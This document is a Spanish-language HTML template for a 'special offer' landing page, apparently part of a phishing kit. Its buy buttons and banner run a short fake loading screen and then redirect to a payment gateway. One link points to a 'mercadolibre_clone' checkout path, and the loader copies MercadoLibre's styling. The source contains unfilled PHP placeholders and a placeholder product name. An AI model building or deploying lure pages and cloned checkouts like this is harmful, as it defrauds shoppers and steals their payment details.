<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>a - Oferta Especial</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;800&display=swap" rel="stylesheet">
    <style>
        body, html {
            margin: 0; padding: 0;
            background-color: #ffffff;
            text-align: center;
            overflow-x: hidden;
        }
        .image-container { position: relative; display: block; width: 100%; max-width: 1920px; margin: 0 auto; }
        .hero-section, .info-section, .reviews-section { position: relative; width: 100%; }
        .img-desktop { width: 100%; display: block; }
        .img-mobile { width: 100%; display: none; }
        .banner-custom-margin { margin: -60px 0; position: relative; z-index: 10; }

        .btn-link {
            position: absolute; display: block; z-index: 10; border-radius: 50px;
            animation: pulse 2s infinite;
            top: 65.13%; left: 32.12%; width: 25.7%; height: 7.4%;
        }
        @keyframes pulse {
            0%   { box-shadow: 0 0 0 0 rgba(255, 230, 0, 0.8); }
            70%  { box-shadow: 0 0 0 20px rgba(255, 230, 0, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 230, 0, 0); }
        }

        .video-wrapper { position: absolute; z-index: 10; border-radius: 12px; overflow: hidden; background: #000; }
        .video-wrapper iframe { width: 100%; height: 100%; border: none; }

        .mobile-gallery-container { display: none; }

        @media (max-width: 768px) {
            .img-desktop { display: none; }
            .img-mobile { display: block; }
            .btn-link { top: 79.5%; left: 0%; width: 100%; height: 11.7%; }
            .video-wrapper { display: none !important; }
            .banner-custom-margin { margin: -140px 0 !important; }
            .mobile-gallery-container { display: block; background-color: #ffffff; padding: 40px 0 60px 0; }
            .gallery-title { font-family: 'Montserrat', sans-serif; font-size: 26px; margin: 0 0 25px 0; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; color: #333; position: relative; display: inline-block; }
            .gallery-title::after { content: ''; display: block; width: 50%; height: 4px; background-color: #ffe600; margin: 8px auto 0; border-radius: 2px; }
            .gallery-wrapper { position: relative; width: 100%; display: flex; align-items: center; }
            .nav-btn { position: absolute; background: #ffe600; color: #333; border: none; width: 40px; height: 40px; border-radius: 50%; font-size: 20px; font-weight: bold; cursor: pointer; z-index: 20; box-shadow: 0 2px 5px rgba(0,0,0,0.2); display: flex; align-items: center; justify-content: center; top: 50%; transform: translateY(-50%); }
            .prev-btn { left: 5px; }
            .next-btn { right: 5px; }
            .mobile-video-gallery { display: flex; overflow-x: auto; scroll-behavior: smooth; scroll-snap-type: x mandatory; -webkit-overflow-scrolling: touch; gap: 20px; padding: 0 20px 20px 20px; scrollbar-width: none; width: 100%; }
            .mobile-video-gallery::-webkit-scrollbar { display: none; }
            .gallery-item { flex: 0 0 85%; scroll-snap-align: center; border-radius: 16px; overflow: hidden; aspect-ratio: 16 / 9; background: #000; position: relative; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
            .gallery-item iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <!-- LOADER -->
    <div id="landing-loader" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255,255,255,0.9); z-index: 9999; flex-direction: column; justify-content: center; align-items: center;">
        <div style="width: 50px; height: 50px; border: 4px solid #ebebeb; border-top-color: #3483fa; border-radius: 50%; animation: spin 1s linear infinite;"></div>
        <div style="margin-top: 20px; font-family: 'Montserrat', sans-serif; font-size: 18px; color: #333; font-weight: 700;">Cargando...</div>
    </div>

    <div class="image-container">
        <!-- SECCIÓN 1: Hero -->
        <div class="hero-section">
            <img src="desktop.png" alt="a Desktop" class="img-desktop">
            <img src="mobile.png" alt="a Mobile" class="img-mobile">
            <a href="#" onclick="cargarLink('" . URL_PASARELA . "/checkout.php?token=c0c30c20b72dfcd83879dfedd842bbd1', event)" class="btn-link" title="Comprar ahora"></a>
        </div>

        <!-- BANNER -->
        <div class="banner-section banner-custom-margin">
            <a href="#" onclick="cargarLink('" . URL_PASARELA . "/pago/mercadolibre_clone/index.php?token=c0c30c20b72dfcd83879dfedd842bbd1', event)" style="display: block; cursor: pointer;">
                <img src="banner.png" alt="Banner Oficial" class="img-desktop" style="width: 100%; height: auto;">
                <img src="bannermobile.png" alt="Banner Oficial Mobile" class="img-mobile" style="width: 100%; height: auto;">
            </a>
        </div>

        <!-- SECCIÓN 2: Info + Videos -->
        <div class="info-section" id="infoContainer">
            <img src="desktop2.png" alt="a Info PC" class="img-desktop">
            <img src="mobile2.png" alt="a Info Mobile" class="img-mobile">
        </div>


        <!-- SECCIÓN 3: Opiniones -->
        <div class="reviews-section">
            <img src="desktop3.png" alt="Opiniones PC" class="img-desktop">
            <img src="mobile3.png" alt="Opiniones Mobile" class="img-mobile">
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const gallery = document.getElementById('mobileGallery');
            const prevBtn = document.querySelector('.prev-btn');
            const nextBtn = document.querySelector('.next-btn');
            if (gallery && prevBtn && nextBtn) {
                const scrollAmount = window.innerWidth * 0.85;
                prevBtn.addEventListener('click', () => gallery.scrollBy({ left: -scrollAmount, behavior: 'smooth' }));
                nextBtn.addEventListener('click', () => gallery.scrollBy({ left: scrollAmount, behavior: 'smooth' }));
            }
        });
        function cargarLink(url, event) {
            if (event) event.preventDefault();
            document.getElementById('landing-loader').style.display = 'flex';
            setTimeout(function() { window.location.href = url; }, 1000);
        }
    </script>
</body>
</html>